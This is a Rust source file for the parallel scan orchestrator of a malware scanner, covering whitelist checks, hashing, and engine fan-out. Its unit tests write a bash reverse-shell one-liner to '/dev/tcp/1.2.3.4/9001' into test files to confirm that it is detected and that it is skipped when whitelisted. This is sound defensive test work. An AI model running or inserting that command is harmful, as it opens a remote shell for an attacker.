//! The scan orchestrator — walks a target, checks the whitelist first, then
//! runs every enabled [`Engine`] over each file **in parallel** using rayon's
//! work-stealing pool.
//!
//! Design notes:
//! * Whitelist is consulted *before* any engine runs, so trusted project files
//!   short-circuit to `Clean` with zero engine cost and zero false positives.
//! * Each file is read from disk exactly once and shared with all engines via
//!   [`FileContext`], avoiding N re-reads for N engines (zero-copy fan-out).
//! * Progress and threats are reported through the [`EventBus`] so any
//!   front-end (CLI now, daemon/UI later) can observe without coupling.

use crate::engine::{Engine, FileContext};
use crate::hashing;
use aegis_core::{Config, Detection, Event, EventBus, FileVerdict, ScanStats, Whitelist};
use rayon::prelude::*;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Instant;

/// Owns the engine set + policy and executes scans.
pub struct Scanner {
    config: Config,
    whitelist: Whitelist,
    engines: Arc<Vec<Box<dyn Engine>>>,
    bus: EventBus,
}

impl Scanner {
    pub fn new(
        config: Config,
        whitelist: Whitelist,
        engines: Vec<Box<dyn Engine>>,
        bus: EventBus,
    ) -> Self {
        Self::new_shared(config, whitelist, Arc::new(engines), bus)
    }

    /// Construct a scanner over a pre-built, shareable engine set. The daemon
    /// builds the (expensive-to-compile) YARA engine once and hands the same
    /// `Arc` to every scan, avoiding recompilation per request.
    pub fn new_shared(
        config: Config,
        whitelist: Whitelist,
        engines: Arc<Vec<Box<dyn Engine>>>,
        bus: EventBus,
    ) -> Self {
        Self {
            config,
            whitelist,
            engines,
            bus,
        }
    }

    pub fn engines(&self) -> &[Box<dyn Engine>] {
        self.engines.as_slice()
    }

    /// Enumerate the regular files under `target` honouring exclusions,
    /// hidden-file and symlink policy.
    pub fn enumerate(&self, target: &Path) -> Vec<PathBuf> {
        if target.is_file() {
            return vec![target.to_path_buf()];
        }
        let mut out = Vec::new();
        let walker = walkdir::WalkDir::new(target)
            .follow_links(self.config.follow_symlinks)
            .into_iter()
            .filter_entry(|e| {
                let p = e.path();
                if self.config.is_excluded(p) {
                    return false;
                }
                if !self.config.scan_hidden {
                    if let Some(name) = p.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with('.') && p != target {
                            return false;
                        }
                    }
                }
                true
            });
        for entry in walker.filter_map(|e| e.ok()) {
            if entry.file_type().is_file() {
                out.push(entry.into_path());
            }
        }
        out
    }

    /// Scan a single file (whitelist → read → engines).
    pub fn scan_file(&self, path: &Path) -> FileVerdict {
        // 1. Path-based whitelist short-circuit (no hashing/read needed).
        if self.whitelist.is_whitelisted(path, "") {
            let mut v = FileVerdict::clean(path.to_path_buf());
            v.whitelisted = true;
            return v;
        }

        // 2. Metadata gate.
        let meta = match std::fs::symlink_metadata(path) {
            Ok(m) => m,
            Err(e) => {
                let mut v = FileVerdict::clean(path.to_path_buf());
                v.error = Some(e.to_string());
                return v;
            }
        };
        if !meta.is_file() {
            let mut v = FileVerdict::clean(path.to_path_buf());
            v.error = Some("not a regular file".into());
            return v;
        }
        let size = meta.len();
        let mut verdict = FileVerdict::clean(path.to_path_buf());
        verdict.size = size;
        if size == 0 {
            return verdict;
        }
        if size > self.config.max_file_size {
            verdict.error = Some("skipped (exceeds max file size)".into());
            return verdict;
        }

        // 3. Hash (enables hash-whitelist + hash engine).
        let digests = match hashing::digest_file(path) {
            Ok(d) => d,
            Err(e) => {
                verdict.error = Some(e.to_string());
                return verdict;
            }
        };
        verdict.sha256 = digests.sha256.clone();

        // 4. Hash-based whitelist.
        if self.whitelist.is_whitelisted(path, &verdict.sha256) {
            verdict.whitelisted = true;
            return verdict;
        }

        // 5. Read once (capped) and fan out to engines.
        let cap = self.config.max_file_size.min(8 * 1024 * 1024) as usize;
        let data = match read_capped(path, cap) {
            Ok(d) => d,
            Err(e) => {
                verdict.error = Some(e.to_string());
                return verdict;
            }
        };
        let ctx = FileContext {
            path,
            data: &data,
            size,
            sha256: &verdict.sha256,
        };
        let mut detections: Vec<Detection> = Vec::new();
        for engine in self.engines.iter() {
            detections.extend(engine.scan(&ctx));
        }
        verdict.detections = detections;
        verdict
    }

    /// Scan a target directory/file in parallel. Returns aggregate stats;
    /// per-file threats stream through the [`EventBus`].
    pub fn scan(&self, target: &Path) -> (ScanStats, Vec<FileVerdict>) {
        let start = Instant::now();
        let files = self.enumerate(target);
        let total = files.len() as u64;
        self.bus.publish(&Event::ScanStarted {
            target: target.to_path_buf(),
            total,
        });

        let index = Arc::new(AtomicU64::new(0));
        let scanned = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));
        let bytes = Arc::new(AtomicU64::new(0));

        // Configure a scoped thread pool if the user pinned a thread count.
        let verdicts: Vec<FileVerdict> = files
            .par_iter()
            .map(|path| {
                let i = index.fetch_add(1, Ordering::Relaxed) + 1;
                self.bus.publish(&Event::FileScanned {
                    path: path.clone(),
                    index: i,
                    total,
                });
                let v = self.scan_file(path);
                if v.error.is_some() {
                    errors.fetch_add(1, Ordering::Relaxed);
                } else {
                    scanned.fetch_add(1, Ordering::Relaxed);
                    bytes.fetch_add(v.size, Ordering::Relaxed);
                }
                if v.is_threat() {
                    self.bus.publish(&Event::ThreatFound(Box::new(v.clone())));
                }
                v
            })
            .collect();

        let threats = verdicts.iter().filter(|v| v.is_threat()).count() as u64;
        let stats = ScanStats {
            total_files: total,
            scanned: scanned.load(Ordering::Relaxed),
            skipped: 0,
            threats,
            errors: errors.load(Ordering::Relaxed),
            bytes_scanned: bytes.load(Ordering::Relaxed),
            duration_ms: start.elapsed().as_millis() as u64,
        };
        self.bus.publish(&Event::ScanFinished(stats.clone()));
        (stats, verdicts)
    }
}

fn read_capped(path: &Path, cap: usize) -> std::io::Result<Vec<u8>> {
    use std::io::Read;
    let mut f = std::fs::File::open(path)?;
    let mut buf = Vec::new();
    f.by_ref().take(cap as u64).read_to_end(&mut buf)?;
    Ok(buf)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::heuristic_engine::HeuristicEngine;

    #[test]
    fn scans_directory_and_flags_threat() {
        let dir = std::env::temp_dir().join(format!("aegis-orch-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("clean.txt"), b"nothing to see here").unwrap();
        std::fs::write(
            dir.join("evil.sh"),
            b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
        )
        .unwrap();

        let engines: Vec<Box<dyn Engine>> = vec![Box::new(HeuristicEngine::default())];
        let scanner = Scanner::new(
            Config::default(),
            Whitelist::default(),
            engines,
            EventBus::new(),
        );
        let (stats, verdicts) = scanner.scan(&dir);
        assert_eq!(stats.total_files, 2);
        assert_eq!(stats.threats, 1);
        assert!(verdicts
            .iter()
            .any(|v| v.is_threat() && v.path.ends_with("evil.sh")));

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn whitelisted_dir_is_skipped() {
        let dir = std::env::temp_dir().join(format!("aegis-wl-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("evil.sh"),
            b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
        )
        .unwrap();

        let mut wl = Whitelist::default();
        wl.add_path(&dir, "trusted", true, 0);
        let engines: Vec<Box<dyn Engine>> = vec![Box::new(HeuristicEngine::default())];
        let scanner = Scanner::new(Config::default(), wl, engines, EventBus::new());
        let (stats, _) = scanner.scan(&dir);
        assert_eq!(stats.threats, 0);

        std::fs::remove_dir_all(&dir).ok();
    }
}
